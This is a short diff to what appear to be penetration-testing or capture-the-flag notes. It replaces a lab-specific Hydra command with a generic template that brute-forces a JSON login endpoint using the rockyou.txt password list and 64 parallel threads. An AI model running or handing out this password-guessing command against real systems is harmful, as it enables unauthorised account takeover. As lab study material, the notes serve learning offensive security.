@@ -24,4 +24,4 @@
 
 ### Example:
 
-#### hydra -l myP14ceAdm1nAcc0uNT -P rockyou.txt 10.10.10.58 -s 3000 http-post-form "/api/session/authenticate{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64
+#### hydra -l USER -P rockyou.txt TARGET_IP -s TARGET_PORT http-post-form "/api/session/authenticate{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64
